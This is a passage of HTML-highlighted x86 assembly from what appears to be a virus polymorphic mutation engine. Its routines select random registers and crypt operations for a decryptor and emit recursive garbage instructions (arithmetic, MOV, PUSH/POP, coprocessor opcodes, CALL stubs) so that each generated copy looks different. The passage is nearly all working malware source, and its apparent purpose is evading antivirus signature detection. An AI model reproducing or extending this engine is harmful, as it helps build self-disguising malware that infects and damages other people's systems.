    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_S2C_div4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Recursion</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">THME_IV_GetCounter</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; Get a valid register for</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                         </span><span class="sc1">; use as counter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetCounter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetCounter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CounterReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">THME_IV_GetPointer</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; Get a valid register for</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                         </span><span class="sc1">; use as a pointer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetPointer</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetPointer</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetPointer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_PointerReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">THME_IV_GetDelta</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; Get a valid register for </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                         </span><span class="sc1">; use as delta</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetDelta</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetDelta</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetDelta</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_IV_GetDelta</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_DeltaReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">                          </span><span class="sc1">; Get math operation for crypt</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CryptOp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"EMHT"</span><span class="sc0">          </span><span class="sc1">; Mark :)</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_ClosePoly</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; Return in ECX the size of</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; the engine (not needed)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Pointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.RETURN_ADDRESS.PUSHAD_ECX</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">     
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; THME_GETREGISTER</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       AL = Register unused by the decryptor</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">THME_GetRegister</span><span class="sc4">:</span><span class="sc0">                               
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CounterReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_PointerReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_DeltaReg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">THME_GR_GetIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                         </span><span class="sc1">; Get a register</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">                        </span><span class="sc1">; Mustn't be ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GR_GetIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Mustn't be equal to counter</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GR_GetIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Mustn't be equal to pointer</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GR_GetIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; Mustn't be equal to delta</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GR_GetIt</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Garbage generator (recursion depht = 3)</span><span class="sc0">

</span><span class="sc5">THME_GenGarbage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Recursion</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increase recursivity</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Recursion</span><span class="sc4">],</span><span class="sc5">RECURSION</span><span class="sc0"> </span><span class="sc1">; Over our limit?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">THME_GG_Exit</span><span class="sc0">                    </span><span class="sc1">; Shitz...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sTHME_GBG_Table</span><span class="sc0">             </span><span class="sc1">; Select a garbage generator</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; from our table</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_GBG_Table</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Call it</span><span class="sc0">

</span><span class="sc5">THME_GG_Exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Recursion</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Decrease recursion level</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Call 6 times to the garbage generator</span><span class="sc0">

</span><span class="sc5">THME_BunchOfShit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">THME_BOS_Loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">THME_BOS_Loop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; THME_GBGB_GETVALIDRIB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       AL = RegInfoByte that could be used for garbage regxx/regxx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">THME_GBG_GetValidRiB</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GetRegister</span><span class="sc0">                </span><span class="sc1">; Get a valid register for be</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; the target</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">THME_GBG_GVRiB</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                           </span><span class="sc1">; Get any register for be used</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; as source</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GBG_GVRiB</span><span class="sc0">                  </span><span class="sc1">; Can't be source=target</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">                    </span><span class="sc1">; Fix this </span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc5">THME_GBG_Arithmetic_EAX_IMM32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">                    </span><span class="sc1">; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">            
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_Arithmetic_REG32_REG32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">                    </span><span class="sc1">; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000011b</span><span class="sc0">    
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">THME_GBG_A_R32_R32_GR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GetRegister</span><span class="sc0">                </span><span class="sc1">; Don't use EAX</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GBG_A_R32_R32_GR</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">THME_GBG_Arithmetic_REG32_IMM32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">                          </span><span class="sc1">; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">THME_GBG_A_R32_I32_GR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GetRegister</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GBG_A_R32_I32_GR</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">       
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_GenOneByter</span><span class="sc4">:</span><span class="sc0">                   
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sTHME_OneByters</span><span class="sc0">             </span><span class="sc1">; NOP/LAHF/INC EAX/DEC EAX/STI/CLD/</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; CMC/STC/CLC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_OneByters</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_GenCopro</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CoproInit</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; If first call, put a FINIT</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GC_GenFINIT</span><span class="sc0">        
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sTHME_OneByters</span><span class="sc0">             </span><span class="sc1">; If not, put any copro opcode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Copro</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GC_GenFINIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CoproInit</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E3DBh</span><span class="sc0">                       </span><span class="sc1">; FINIT</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_MOV_REG16_REG16</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">                          </span><span class="sc1">; MOV ?X,?X</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GBG_GetValidRiB</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_MOV_REG16_IMM16</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">                          </span><span class="sc1">; MOV ?X,????</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GetRegister</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_MOV_REG32_REG32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GBG_GetValidRiB</span><span class="sc0">            </span><span class="sc1">; MOV E??,E??</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_MOV_REG32_IMM32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GetRegister</span><span class="sc0">                </span><span class="sc1">; MOV E??,????????</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_GenPUSHPOP</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; PUSH E??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                           </span><span class="sc1">; ...</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; POP E??</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GetRegister</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GBG_GenCALL_Type1</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; CALL @@1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">                         </span><span class="sc1">; ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; JMP @@2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; @@1:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; ...</span><span class="sc0">
